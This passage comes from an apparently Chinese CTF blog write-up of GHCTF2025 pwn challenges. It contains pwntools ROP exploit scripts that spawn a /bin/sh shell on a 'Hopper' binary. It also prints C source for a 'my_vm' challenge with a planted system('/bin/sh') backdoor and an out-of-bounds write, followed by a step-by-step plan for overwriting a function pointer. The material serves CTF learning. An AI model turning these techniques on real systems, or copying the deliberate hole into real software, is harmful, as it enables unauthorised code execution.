src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081102077.png" alt="image-20250310081102077"></p><ul><li>所以就会出现系统调用失败</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081249245.png" alt="image-20250310081249245"></p><ul><li>这时我们就要利用<code>gadgets</code>对<code>rdx</code>这个寄存器清零操作</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310081354593.png" alt="image-20250310081354593"></p><ul><li><p>这时我们发现这个程序在异或完还会<code>jmp r15</code>，所以我们是不是能先将<code>r15</code>的值赋值成<code>syscall_addr</code>（第一次调用syscall那个地址主要的目的是指向交换两个寄存器的值，此时由于syscall传递的参数不符合，syscall会调用失败。）并且之后执行完xchg后我们就跳转到<code>xor rdx,rdx</code>，这时我们发现<code>r15</code>还指向<code>syscall</code>的地址</p></li><li><p>所以修改一下布置的栈，修改后栈布置如下：</p></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310083318778.png" alt="image-20250310083318778"></p><ul><li>动调算到的偏移，为程序泄露出来的栈地址<code>leak_addr+0x28</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x401017</span></span><br><span class="line">syscall = <span class="number">0x40100A</span></span><br><span class="line">xchg = <span class="number">0x40100C</span></span><br><span class="line">pop_r15=<span class="number">0x40101C</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;    (&quot; ~----( ~   Y.  )\n&#x27;</span>)</span><br><span class="line">a = p.recvline()[:<span class="number">6</span>]</span><br><span class="line">a = <span class="built_in">int</span>.from_bytes(a,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---&gt;&quot;</span>,<span class="built_in">hex</span>(a))</span><br><span class="line">payload = p64(pop_r15)+p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(a+<span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">payload += p64(<span class="number">0x401021</span>)+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="你真会布栈吗思路2_只利用xchg-raxr13"><a href="#你真会布栈吗？思路2-只利用xchg-rax-r13" class="headerlink" title="你真会布栈吗？思路2_只利用xchg rax,r13"></a>你真会布栈吗？思路2_只利用xchg rax,r13</h2><ul><li>这个就是单纯的布置栈了。这个我就不写了（写得好累）</li><li>直接贴exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28015)</span></span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">pop_r13_r15 = <span class="number">0x401019</span></span><br><span class="line">print_addr = <span class="number">0x401000</span></span><br><span class="line">a = p64(pop_r13_r15) + p64(<span class="number">0x0</span>) + p64(print_addr) + p64(<span class="number">0x40101c</span>) + p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x40101c</span>) +p64(<span class="number">0x401017</span>)</span><br><span class="line">a += p64(<span class="number">0x0</span>) + p64(<span class="number">0x402000</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">59</span>) + p64(<span class="number">0x40100A</span>) + p64(<span class="number">0x401021</span>)</span><br><span class="line"><span class="comment">#a += p64(0x40100A)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,a)</span><br><span class="line">b = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#p.send(b&#x27; &#x27;)</span></span><br><span class="line">p.interactive()                          </span><br></pre></td></tr></table></figure><h1 id="my_vm"><a href="#my-vm" class="headerlink" title="my_vm"></a>my_vm</h1><ul><li><p>主要考点就是：<code>vm_pwn</code>、<code>固定指令设计</code>、<code>越界读写</code></p></li><li><p>这题就是<code>[OGeek2019 Final]OVM</code>这题改编的，已经改编的比较有好了。原题在动调的时候会比较麻烦，并且越界读写计算偏移比较麻烦。</p></li><li><p>修改的源码如下，现在就放出我修改的源码：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> memory[<span class="number">65536</span>];</span><br><span class="line"><span class="type">int</span> reg[<span class="number">12</span>];</span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">void</span> (*funcptr)();</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">fetch</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a1;</span><br><span class="line">a1 = memory[reg[<span class="number">11</span>]];</span><br><span class="line">reg[<span class="number">11</span>] += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cmd;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> r3;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> imm;</span><br><span class="line">cmd = (code &amp; <span class="number">0xff000000</span>)&gt;&gt; <span class="number">24</span>;</span><br><span class="line">r1  = (code &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">r2  = (code &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">r3  = (code &amp; <span class="number">0xf</span>);</span><br><span class="line">imm = code&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">if</span> (r1 &gt; <span class="number">11</span> || r2 &gt; <span class="number">11</span> || r3 &gt; <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;out of index&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(cmd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">reg[r1] = imm;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line"><span class="built_in">stack</span>[reg[<span class="number">10</span>]] = reg[r1];</span><br><span class="line">reg[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">reg[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">reg[r1] = <span class="built_in">stack</span>[reg[<span class="number">10</span>]];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">reg[r1] = reg[r2] + reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">reg[r1] = reg[r2] - reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">reg[r1] = reg[r2] ^ reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x70</span>:</span><br><span class="line">reg[r1] = reg[r2] &gt;&gt; reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">reg[r1] = reg[r2] &lt;&lt; reg[r3];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">memory[reg[r1]] = reg[r2];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> ip;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> sp;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line"><span class="type">int</span> code;</span><br><span class="line">funcptr = my_print;</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;This is my vm.\n&quot;</span>,<span class="number">15</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;set your IP:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;ip);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;set your SP:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;sp);</span><br><span class="line">getchar();</span><br><span class="line">reg[<span class="number">10</span>] = sp;</span><br><span class="line">reg[<span class="number">11</span>] = ip;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( ip &gt; <span class="number">0x2000</span> || !sp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;How much code do you want to execve:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;size);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;memory[count]);</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">&#123;</span><br><span class="line">code = fetch();</span><br><span class="line">execute(code);</span><br><span class="line">&#125;</span><br><span class="line">funcptr();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>对于<code>vm_pwn</code>的这类题目，其实有涉及到一点计算机组成原理的<code>设计操作码</code>的技术。在计算机组成原理中，我们可以采用固定操作码的技术，也可以采用<code>扩展操作码</code>的技术。</li><li>这里我们稍微介绍一下固定操作码和拓展操作码。以我们常用的<code>64</code>位计算机为例子。</li><li><p>在<code>x64</code>架构下，我们的处理器一次能处理<code>8</code>字节的数据，我们在设计二进制操作码的时候可以这么设计。</p><ul><li>我们可以固定最高<code>16</code>位（也就是<code>49-64</code>位）表示要执行的指令，比如<code>mov</code>、<code>sub</code>、<code>add</code>这些指令</li><li>而我们而我们还可以分别设计<code>33-48</code>位表示目的寄存器的编号，<code>17-32</code>位表示源寄存器的编号，<code>1-16</code>位也还可以表示源寄存器的编号。</li><li>这时我们的固定指令三寄存器操作就设计完成了。就像题目<code>gift</code>中所给出的这样（虽然题目的是32位的操作码）</li><li><strong>固定指令操作码</strong>：本质上就是指令固定长度，即我们固定<code>49-64</code>位这边<code>16字节</code>就表示操作码。不管是二寄存器操作还是一寄存器操作</li></ul></li><li><p><strong>扩展操作码</strong>：在我们执行三寄存器指令的时候，我们也使用<code>49-64</code>位表示指令，但是我们要留<code>1</code>位标志位，表示程序执行的操作码是二指令操作码。</p><ul><li>例如下图，我们选取第<code>49</code>位作为标志位，这时当标志位为<code>0</code>时执行的是<code>3</code>寄存器操作，这是<code>49-64</code>位表示指令（包含了标志位）</li><li>而当我们标志位为<code>1</code>时，我们执行的是<code>2</code>寄存器操作，这时我们<code>33-64</code>（包含了标志位）表示的就是指令并且表示<code>2</code>寄存器操作的指令，这时我们指令由原来的最高<code>16</code>位表示，拓展成了最高<code>32</code>位程序表示</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163934291.png" alt="image-20250310163934291"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310163954263.png" alt="image-20250310163954263"></p><h2 id="myvm分析1"><a href="#myvm分析1" class="headerlink" title="myvm分析1"></a>my<em>vm</em>分析1</h2><ul><li>按照流程我们先来<code>check</code>一下保护机制。发现并没有开启<code>PIE</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310084657045.png" alt="image-20250310084657045"></p><ul><li><p>现在我们来反编译这个程序，查看一下这个程序的具体运行逻辑</p></li><li><p>我们先来查看<code>main</code>函数，我们按顺序分析这个程序</p><ul><li>首先会<code>funcptr</code>是一个函数指针，它指向了<code>my_print</code>这个函数，并且使用<code>init</code>对输入输出进行初始化</li><li>然后程序会让用户输入<code>SP</code>和<code>IP</code>，并且将用户输入的值放入<code>sp</code>和<code>ip</code>寄存器中。并检查用户输入的初始化值是否合法</li><li>之后程序会让用户输入程序要执行的指令数。然后进入循环，执行两个函数</li><li>最后调用<code>funcptr</code>这个函数指针指向的函数</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310164804658.png" alt="image-20250310164804658"></p><ul><li>接下来我们查看一下<code>fetch()</code>这个函数，发现就是一个取<code>memory[ip]</code>的值，并且将<code>ip</code>自增，然后返回取出来的值</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165549267.png" alt="image-20250310165549267"></p><ul><li>接下来查看一下<code>execute()</code>这个函数，这个函数会将前面取出来的<code>memory[ip]</code>指令作为参数传递</li><li>这里我们一开始并不知道<code>HIBYTE(a1)</code>的值，此时我们就要查看汇编理解一下，我们先看到<code>v5</code>存储在<code>rbp-8</code>这个栈地址中</li><li>通过汇编我们可以看到<code>v5</code>存储的是<code>a1</code>的最高<code>8</code>位，之后通过伪c代码就可以看到<ul><li><code>v2</code>存储的值是<code>a1</code>的第<code>17-20</code>位</li><li><code>v3</code>存储的值是<code>a1</code>的第<code>9-12</code>位</li><li><code>v4</code>存储的值是<code>a1</code>的第<code>1-4</code>位</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310165818475.png" alt="image-20250310165818475"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170324721.png" alt="image-20250310170324721"></p><ul><li>我们接下去查看，我们会发现当<code>v5</code>即（<code>a1</code>的最高<code>8</code>位为特定的值时，会执行特定的类似于汇编指令）就像图中<ul><li><code>v5=0x50</code>，则会执行<code>reg[v2]=reg[v3]-reg[v4]</code>,也就是执行<code>sub</code>指令</li><li><code>v5=0x70</code>，则会执行<code>reg[v2]=reg[v3]&gt;&gt;reg[v4]</code>，也就执行<code>shr</code>指令</li><li>这时我们就可以知道，变量<code>v2</code>、<code>v3</code>、<code>v4</code>就代表着寄存器的编号。</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310170704072.png" alt="image-20250310170704072"></p><ul><li>这时我们通过逆向，可以归纳出剩下的指令，而该函数模拟的指令如下，这时我们还注意到<code>reg</code>这个数组是<code>int</code>类型，而不是<code>unsigned</code>类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>  reg[v2] = imm;      mov imm</span><br><span class="line"><span class="number">0x20</span>  push reg[v2];  push</span><br><span class="line"><span class="number">0x30</span>  pop reg[v2] pop</span><br><span class="line"><span class="number">0x40</span>  reg[v2] = reg[v3] + reg[v4];  add</span><br><span class="line"><span class="number">0x50</span>  reg[v2] = reg[v3] - reg[v4];  sub</span><br><span class="line"><span class="number">0x60</span>  reg[v2] = reg[v3] ^ reg[v4];xor</span><br><span class="line"><span class="number">0x70</span>  reg[v2] = reg[v3] &gt;&gt; reg[v4];shr</span><br><span class="line"><span class="number">0x80</span>  reg[v2] = reg[v3] &lt;&lt; reg[v4];shl</span><br><span class="line"><span class="number">0x90</span>  memory[reg[v2]] = reg[v3];mov [reg[v2]],reg[v3]</span><br></pre></td></tr></table></figure><ul><li>我们在函数这块还注意到有一个<code>后门函数</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172420018.png" alt="image-20250310172420018"></p><ul><li>我们现在来查看一下<code>.bss</code>段的全局变量，这时我们发现<code>funcptr</code>就在<code>memory</code>相邻低地址处</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172233421.png" alt="image-20250310172233421"></p><ul><li>我们还注意到有<code>reg</code>这个数组</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172727594.png" alt="image-20250310172727594"></p><ul><li>还注意到<code>stack</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310172747886.png" alt="image-20250310172747886"></p><h2 id="my_vm分析2"><a href="#my-vm分析2" class="headerlink" title="my_vm分析2"></a>my_vm分析2</h2><ul><li>这时我们可以确定漏洞点，就是利用<code>memory[reg[v2]]</code>这个指令进行负索引，从而修改<code>funcptr</code>这个指针为<code>backdoor()</code>这个函数的地址。</li><li><p>接下来我们就来构造一个负索引，我们先初始化<code>sp=0</code>、<code>ip=0x1000</code></p></li><li><p>首先我们需要构造寄存器的值为负值。一开始我们的各个寄存器都为<code>0</code>,我们先通过<code>mov imm</code>操作，将这个寄存器<code>0、1、2</code>赋值为<code>8、4、20</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">20</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">sp=<span class="number">0</span></span><br><span class="line">ip=<span class="number">0x100</span></span><br></pre></td></tr></table></figure><ul><li>之后我们通过<code>0x80</code>左移操作，将寄存器<code>r1</code>设置为<code>0x400000</code>，即：<code>r1=r1 &lt;&lt; r2</code>（<code>r1 =  4 &lt;&lt; 20</code>）</li><li>然后通过<code>0x10</code>这个操作将<code>0x877</code>赋值给<code>r3</code></li><li>最后通过<code>0x40</code>这个操作（<code>add</code>）将<code>r1</code>的值变为<code>0x400877</code>，这就是<code>backdoor</code>的地址，这一步操作就是为越界读写修改函数指针做准备</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[0]=8</span><br><span class="line">reg[1]=0x400877</span><br><span class="line">reg[2]=20</span><br><span class="line">reg[3]=0x877</span><br><span class="line">reg[4]=0</span><br><span class="line">reg[5]=0</span><br><span class="line">reg[6]=0</span><br><span class="line">reg[7]=0</span><br><span class="line">reg[8]=0</span><br><span class="line">reg[9]=0</span><br><span class="line">sp=0</span><br><span 